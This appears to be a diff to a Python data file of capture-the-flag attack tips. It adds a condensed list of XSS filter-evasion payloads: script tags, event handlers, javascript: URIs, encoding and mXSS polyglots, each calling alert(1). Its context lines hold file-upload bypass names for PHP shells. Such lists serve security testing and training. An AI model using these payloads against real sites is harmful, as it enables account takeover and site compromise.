@@ -82,3 +82,27 @@ FILE_UPLOAD_TRICKS = [
     {"Technique": "Double Extensions", "Payload/Tip": "`shell.php.jpg` or `shell.jpg.php` (if Apache processes right-to-left)"},
     {"Technique": "Null Byte Injection (PHP <= 5.3.4)", "Payload/Tip": "`shell.php%00.jpg` or `shell.php\\x00.jpg`"}
 ]
+
+# OWASP XSS Filter Evasion Cheat Sheet (condensed) — used for XSS-to-admin / stored XSS challenges
+XSS_EVASION = [
+    {"Technique": "Basic Script Tag", "Payload/Tip": "<script>alert(1)</script>"},
+    {"Technique": "Case Obfuscation", "Payload/Tip": "<ScRiPt>alert(1)</sCrIpT>"},
+    {"Technique": "Whitespace / Newline Injection", "Payload/Tip": "<script\\n>alert(1)</script>  or  <script\\t>alert(1)</script>"},
+    {"Technique": "HTML Entity Encoding", "Payload/Tip": "&lt;script&gt;alert(1)&lt;/script&gt;  or  &#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;"},
+    {"Technique": "Image onerror", "Payload/Tip": "<img src=x onerror=alert(1)>"},
+    {"Technique": "SVG onload", "Payload/Tip": "<svg onload=alert(1)>"},
+    {"Technique": "Body onload", "Payload/Tip": "<body onload=alert(1)>"},
+    {"Technique": "Input autofocus onfocus", "Payload/Tip": "<input autofocus onfocus=alert(1)>"},
+    {"Technique": "Details ontoggle", "Payload/Tip": "<details open ontoggle=alert(1)>"},
+    {"Technique": "Marquee onstart", "Payload/Tip": "<marquee onstart=alert(1)>"},
+    {"Technique": "javascript: URI", "Payload/Tip": "<a href=javascript:alert(1)>x</a>  or  <iframe src=javascript:alert(1)>"},
+    {"Technique": "Tag/Attribute Obfuscation", "Payload/Tip": "<svg/onload=alert(1)>  or  <img src=x onerror=&#97;lert(1)>"},
+    {"Technique": "Encoded Event Handler", "Payload/Tip": "<img src=x onerror=alert&#40;1&#41;>"},
+    {"Technique": "Null Byte / Tab / Newline in Tag", "Payload/Tip": "<img%0Asrc=x%0Aonerror=alert(1)>  or  <img src=x onerror=alert(1)%00>"},
+    {"Technique": "mXSS / Polyglot", "Payload/Tip": "<svg><script>alert(1)</script></svg>  or  <math><mtext><script>alert(1)</script></mtext></math>"},
+    {"Technique": "Nested / Broken Tag", "Payload/Tip": "<scr<script>ipt>alert(1)</scr</script>ipt>"},
+    {"Technique": "Double Encoding", "Payload/Tip": "%253Cscript%253Ealert(1)%253C/script%253E"},
+    {"Technique": "CSS / Style-Based", "Payload/Tip": "<div style=\"background:url(javascript:alert(1))\">x</div>  or  <style>@import 'javascript:alert(1)';</style>"},
+    {"Technique": "SVG foreignObject", "Payload/Tip": "<svg><foreignObject><iframe src=javascript:alert(1)></iframe></foreignObject></svg>"},
+    {"Technique": "noscript Breakout (mXSS)", "Payload/Tip": "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">"},
+]
